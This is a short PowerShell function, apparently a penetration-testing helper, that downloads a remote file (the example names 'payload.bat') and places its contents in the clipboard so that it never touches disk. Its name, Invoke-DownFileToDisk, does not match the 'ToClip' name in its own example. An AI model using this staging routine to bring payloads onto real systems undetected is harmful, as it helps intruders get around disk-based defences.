Function Invoke-DownFileToDisk 
{
    <#
            .Synopsis
            Retrieve a file from a remote Server and place in clipboard

            .Description
            This cmdlet will take a URL of a file, download the file from the remote server and place the file in the clipboard for future use, without touching disk.

            .Parameter url
            URL of the remote file

            Written by Dave Hardy, davehardy20@gmail.com @davehardy20

            Version 0.1

            .Example
            PS> Invoke-DownFileToClip -url http://127.0.0.1:8000/payload.bat
    #>

    [cmdletbinding()]
    Param
    (
        [Parameter(Mandatory = $true,
        HelpMessage = 'Remote Server Url')]
        [ValidateNotNullorEmpty()]
        [string]$url
    )

    $Command = '' #This is the variable to store the downloaded payload

    #webclient variables
    $web = New-Object -TypeName System.Net.WebClient
    $web.UseDefaultCredentials = $true
    $Command = $web.DownloadString($url)

    #Put the download file to the clipboard.
    $null = [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
    [Windows.Forms.Clipboard]::SetText($Command)
}
